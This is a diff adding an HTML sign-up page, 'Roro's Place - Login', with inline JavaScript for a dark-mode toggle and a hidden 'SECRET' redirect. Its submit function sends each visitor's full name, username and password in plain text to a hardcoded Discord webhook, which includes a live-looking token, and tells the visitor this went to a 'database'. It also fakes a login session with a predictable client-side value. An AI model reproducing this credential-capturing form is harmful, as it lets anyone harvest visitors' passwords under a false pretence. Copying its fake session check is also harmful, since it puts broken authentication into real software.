@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+    <title>Roro's Place - Login</title>
+    <link rel="icon" type="images/x-icon" href="./images/P.ico">
+    <link href='https://fonts.googleapis.com/css?family=Ubuntu' rel='stylesheet'>
+</head>
+<script>
+//
+
+let currentMode = "dark";
+    
+function darkmode() {
+    if(currentMode == "light") {
+        document.body.style.backgroundColor = "black";
+        document.getElementById("userLabel").style.color = "white";
+        document.getElementById("passLabel").style.color = "white";
+        document.getElementById("fullnamelabel").style.color = "white";
+        //document.getElementById("darkMode").style.backgroundColor = "white";
+        //document.getElementById("darkMode").style.color = "black";
+        //document.getElementById("darkMode").innerHTML = "Light";
+        currentMode = "dark";
+        localStorage.setItem("theme", currentMode);
+    } else {
+        document.body.style.backgroundColor = "white";
+        document.getElementById("userLabel").style.color = "black";
+        document.getElementById("passLabel").style.color = "black";
+        document.getElementById("fullnamelabel").style.color = "black";
+        //document.getElementById("darkMode").style.backgroundColor = "black";
+        //document.getElementById("darkMode").style.color = "white";
+        //document.getElementById("darkMode").innerHTML = "Dark";
+        currentMode = "light";
+        localStorage.setItem("theme", currentMode);
+    }
+}
+document.addEventListener("keydown", function(event) {
+  if (event.key === "Enter") {
+    // Your code to record the enter key press goes here
+    document.getElementById("submit").click();
+  }
+});
+
+function clearBoxes() {
+    document.getElementById("username").value = "";
+    document.getElementById("password").value = "";
+}
+
+function submitPass() {
+  const request = new XMLHttpRequest();
+  const fullName = document.getElementById("fullname").value;
+  const username = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
+
+  const userpass = "username: " + username + "password: " + password;
+
+  request.open("POST", "https://discord.com/api/webhooks/1163608897869860904/LZIjKSac3rph6KPeu3dw9yrsyU98jGzjWIkH6R2LdyuGqr2Ot18w25IwOz50ktCoNoNC");
+  request.setRequestHeader('Content-type', 'application/json');
+
+  const params = {
+    username: fullName,
+    avatar_url: "",
+    content: userpass
+  };
+  try {
+    request.send(JSON.stringify(params));
+    alert("Success!");
+    document.getElementById("fullname").value = "";
+    document.getElementById("username").value = "";
+    document.getElementById("password").value = "";
+  }
+  catch(err) {
+    alert("Error sending information to database... Try again later...");
+    document.getElementById("fullname").value = "";
+    document.getElementById("username").value = "";
+    document.getElementById("password").value = "";
+  }
+}
+
+function rot13(str) {
+  var result = "";
+  
+  for (var i = 0; i < str.length; i++) {
+    var charCode = str.charCodeAt(i);
+    
+    if (charCode >= 65 && charCode <= 90) { // Uppercase letters
+      result += String.fromCharCode((charCode - 65 + 13) % 26 + 65);
+    } else if (charCode >= 97 && charCode <= 122) { // Lowercase letters
+      result += String.fromCharCode((charCode - 97 + 13) % 26 + 97);
+    } else {
+      result += str.charAt(i); // Non-alphabetic characters
+    }
+  }
+  
+  return result;
+}
+function heheheha() {
+    let first = "1";
+    for (let i = 0; i < 5; i++) {
+        first = first + String(Math.floor((Math.random() * 100) + 1));
+    }
+    first = first + "ballsack";
+    for (let i = 0; i < 5; i++) {
+        first = first + String(Math.floor((Math.random() * 100) + 1));
+    }
+    sessionStorage.setItem("cookie", first);
+    //alert(sessionStorage.getItem("cookie"));
+    window.location.replace("./projects.html");
+    
+}
+
+</script>
+
+
+
+<style>
+    body {
+        transition: background-color: 5s;
+        text-align: center;
+        font-family: Sans-Serif;
+    }
+    #userLabel {
+        color: black;
+        font-size: 20px;
+        font-family: 'Roboto';
+    }
+    #passLabel {
+        color: black;
+        font-size: 20px;
+        font-family: 'Roboto';
+    }
+    #username {
+        padding: 12px 20px;
+        width: 50%;
+        color: white;
+        background-color: #3CBC8D;
+        border: 3px #3CBC8D;
+        border-radius: 50px;
+    }
+    #password {
+        padding: 12px 20px;
+        width: 50%;
+        color: white;
+        background-color: #3CBC8D;
+        border: 3px #3CBC8D;
+        border-radius: 50px;
+    }
+    #fullname {
+        padding: 12px 20px;
+        width: 50%;
+        color: white;
+        background-color: #3CBC8D;
+        border: 3px #3CBC8D;
+        border-radius: 50px;
+    }
+
+
+    .fullLogin {
+        height: 230px;
+        width: 400px;
+        position: relative;
+        border: 3px solid green;
+        border-radius: 5px;
+        margin-top: 190px;
+        text-align: center;
+    }
+    #darkMode {
+        position: absolute;
+        height: 50px;
+        width: 50px;
+        top: 0px;
+        left: 0px;
+        border-radius: 50px;
+        background-color: white;
+    }
+    .submitBut {
+        margin-top: 100px;
+        margin-bottom: 10px;
+    }
+    #submit {
+        font-size: 25px;
+        transition-duration: 1s;
+        border: none;
+        length: 120%;
+        width: 50%;
+        position: absolute;
+        top: 190px;
+        left: 100px;
+        visibility: visible;
+    }
+    #submitload {
+        font-size: 25px;
+        transition-duration: 1s;
+        border: none;
+        length: 120%;
+        width: 50%;
+        position: absolute;
+        top: 190px;
+        left: 100px;
+        visibility: hidden;
+    }
+    #submit:hover {
+        color: #C264FF;
+        background-color: #63E5FF;
+        border-radius: 70px;
+        border: 3px;
+        border-color: black;
+        transition-duration: 0.6x;
+    }
+    
+    #redirect {
+        margin-top: 30px;
+        visibility: hidden;
+    }
+    .center {
+        text-align: center;
+    }
+    
+
+
+</style>
+
+
+<body>
+<center>
+    <div class="fullLogin">
+        <div class="fullName">
+            <center><label id="fullnamelabel" for="fullname">Full Name</label></center>
+            <center><input type="text" id="fullname"></center>
+        </div>
+        <div class="userName">
+            <center><label id="userLabel" for="username">Username</label></center>
+            <center><input type="text" id="username"></center>
+        </div>
+        <div class="passWord">
+            <center><label id="passLabel" for="password">Password</label></center>
+            <center><input type="password" id="password" </input></center>
+        </div>
+        <div class="submitBut">
+            <center><button id="submit" onclick="submitPass()">Sign Up!</button></center>
+            <center><button id="submitload" onclick=""><img src="./images/loading_gif_cropped.gif" alt="loading..." width="55px"></button></center>
+        </div>
+
+
+<button id="redirect" onclick="heheheha()">SECRET >:D</button>
+
+
+</center>
+<button id="darkMode" onClick="darkmode()"><img src="./images/moon.png" alt="moon" width="40px"></button>
+</body>
+</html>
